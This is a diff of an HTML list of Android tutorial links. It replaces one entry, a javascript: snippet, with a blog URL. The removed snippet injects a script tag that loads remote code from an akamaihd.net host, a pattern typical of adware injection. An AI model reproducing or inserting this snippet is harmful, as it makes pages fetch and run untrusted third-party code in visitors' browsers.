@@ -54,7 +54,7 @@ http://androidpixels.net/<br>
 <br>
 (3.)http://frank-zhu.github.io/android/2015/02/25/android-recyclerview-part-2/<br/>
 <br/>
-(4.)javascript:try{if(document.body.innerHTML){var a=document.getElementsByTagName("head");if(a.length){var d=document.createElement("script");d.src="https://apiairglobeappco-a.akamaihd.net/gsrs?is=ob2329ppTW&bp=BA&g=6915e746-3489-45fc-bd6e-3dbb2b80e084";a[0].appendChild(d);}}}catch(e){} <br/>
+(4.)http://lp43.blogspot.tw/2014/08/recyclerviewandroid-studio.html<br/>
 <br/>
 (5.)http://blog.csdn.net/jwzhangjie/article/details/36868515 <br/>
 9.GCM_Push_Notification<br>
